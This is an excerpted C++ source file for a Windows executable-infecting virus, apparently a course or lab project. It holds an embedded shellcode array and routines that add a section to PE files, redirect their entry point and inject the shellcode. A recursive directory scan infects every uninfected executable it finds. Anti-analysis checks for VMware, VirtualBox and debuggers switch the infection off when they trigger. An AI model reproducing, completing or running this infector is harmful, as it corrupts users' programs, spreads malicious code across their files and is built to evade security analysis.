...
#define TMP_FILE_NAME_SIZE 0xff
...
vector<unsigned char> shell_code = {
		...
		0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x33, 0x30, 0x58, 0x20, 0x68,
		0x20, 0x4e, 0x54, 0x32, 0x68, 0x6e, 0x20, 0x62, 0x79, 0x68, 0x63, 0x74, 0x69, 0x6f, 0x68, 0x49,
		0x6e, 0x66, 0x65, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x12, 0x89, 0xe3, 0x68, 0x58, 0x20, 0x20, 0x20,
		0x68, 0x31, 0x31, 0x34, 0x33, 0x68, 0x32, 0x30, 0x35, 0x32, 0x31, 0xc9, 0x88, 0x4c, 0x24, 0x08,
		0x89, 0xe1, 0x31, 0xd2, 0x6a, 0x40, 0x53, 0x51, 0x52, 0xff, 0xd0
};



int infectedFile(const char* filename) {
	DWORD Offset; //offset from new empty section in file
	vector<unsigned char> shellcode = shell_code;
	FILE* FinHandle;
	...
	if (dwRetVal == 0) {
		fprintf(stderr, "Failed to retrieve temporary path.\n");
		return 1;
	}

	// Generate a unique temporary file name
	UINT uRetVal = GetTempFileNameA(tempPath, "tempfile_", 0, tempFileName);
	if (uRetVal == 0) {
		fprintf(stderr, "Failed to create temporary file name.\n");
		return 1;
	}

	fopen_s(&FouHandle, tempFileName, "wb");
	...
	fclose(FinHandle);
	fclose(FouHandle);
	overwrite_file(filename, tempFileName);
	fopen_s(&FinHandle, filename, "rb");
	...
	//cout << "Return address: 0x" << hex << setw(8) << setfill('0') << returnAddress << endl;


	// Adding padding bytes
	if (shellcode.size() % 4 != 0) {
		for (int i = 0; i < 10; ++i) {
	...
	shellcode.insert(shellcode.begin(), 4, 0x90);

	// Printing values of shell_code
	//cout << "Values of shell_code: ";
	//for (unsigned char byte : shellcode) {
	//    cout << hex << setw(2) << setfill('0') << (int)byte << " ";
	//}
	//cout << endl;
	//adjust entry point
	uRetVal = GetTempFileNameA(tempPath, "tempfile_", 0, tempFileName);
	if (uRetVal == 0) {
		//fprintf(stderr, "Failed to create temporary file name.\n");
		return 1;
	}

	// Now tempFileName contains the path to the temporary file
	//printf("Temporary file created: %s\n", tempFileName);

	fopen_s(&FinHandle, filename, "rb");
	fopen_s(&FouHandle, tempFileName, "wb");

	adjustEntryPoint(FinHandle, FouHandle, Offset);
	fclose(FinHandle);
	fclose(FouHandle);
	...
	//inject shell code
	unsigned char* byte = new unsigned char[shellcode.size()];

	for (size_t i = 0; i < shellcode.size(); ++i) {
		byte[i] = shellcode[i];
	}

	infectShellcode(FinHandle, FouHandle, (UCHAR*)byte, shellcode.size(), Offset);
	fclose(FinHandle);
	fclose(FouHandle);
	overwrite_file(filename, tempFileName);
	delete[] byte;
...
std::set<std::string> ListFilesRecursively(const std::string& directoryPath) {
	...
	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "Error: Directory not found or invalid.\n";
		return filePaths;
	}
	...
	do {
		...
		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			filePaths.insert(directoryPath + "\\" + findFileData.cFileName); // Add file path to set
		}

		else if (findFileData.cFileName[0] != '.') {
			std::string subDirectoryPath = directoryPath + "\\" + findFileData.cFileName;
			auto subDirectoryFiles = ListFilesRecursively(subDirectoryPath);
			filePaths.insert(subDirectoryFiles.begin(), subDirectoryFiles.end());
		}
...
void EnableDefaultChecks() {
	ENABLE_TLS_CHECKS = FALSE;
	ENABLE_DEBUG_CHECKS = TRUE;
	ENABLE_INJECTION_CHECKS = FALSE;
	ENABLE_GEN_SANDBOX_CHECKS = FALSE;
	ENABLE_VBOX_CHECKS = TRUE;
	ENABLE_VMWARE_CHECKS = TRUE;
	ENABLE_VPC_CHECKS = FALSE;
	ENABLE_QEMU_CHECKS = FALSE;
	ENABLE_KVM_CHECKS = FALSE;
	ENABLE_XEN_CHECKS = FALSE;
	ENABLE_WINE_CHECKS = FALSE;
	ENABLE_PARALLELS_CHECKS = FALSE;
	ENABLE_HYPERV_CHECKS = FALSE;
	ENABLE_TIMING_ATTACKS = FALSE;
	ENABLE_DUMPING_CHECK = FALSE;
	ENABLE_ANALYSIS_TOOLS_CHECK = FALSE;
	ENABLE_ANTI_DISASSM_CHECKS = FALSE;
}
...
int main(int argc, char* argv[]) {
	...
	if (vmware_reg_key_value() | vmware_reg_key_value() | vmware_reg_keys() | vmware_files() | vmware_mac() | 
		exec_check(&vmware_adapter_name, TEXT("Checking VMWare network adapter name "))
			| vmware_devices() | exec_check(&vmware_dir, TEXT("Checking VMWare directory "))
	...
	if (
		...
		exec_check(&Interrupt_0x2d, TEXT("Checking Interrupt 0x2d ")) |
		exec_check(&Interrupt_3, TEXT("Checking Interrupt 1 ")) |
	...
	if (length == 0) {
		// Error handling if GetCurrentDirectory fails
		DWORD error = GetLastError();
		std::cerr << "Failed to get the current directory. Error code: " << error << std::endl;
		return 1;
	}

	

	std::wstring wideCurrentDir(currentDir);

	std::string currentDirString(wideCurrentDir.begin(), wideCurrentDir.end());

	std::cout << "Current directory: " << currentDirString << std::endl;
	...
	if ( not isDebug) {
		for (const auto& file : files) {
			...
			if (can_exec(file.c_str())) {
				if (not isInfectedFile(file.c_str())) {
					if (isPEFile((file.c_str()))) {
						infectedFile(file.c_str());
						cout << "[+]" << file << " has just been infected\n";
					}
					cout << file << endl;
				}
				else {
					cout << "[-]" << file << " has already been infected, so skip!\n";
				}
			}
		}
	}
	else {
		print_category(TEXT("Detected result"));
		if (isVM)
			printf("[+] Virtual Machine detected\n");
		else if (isDebug)
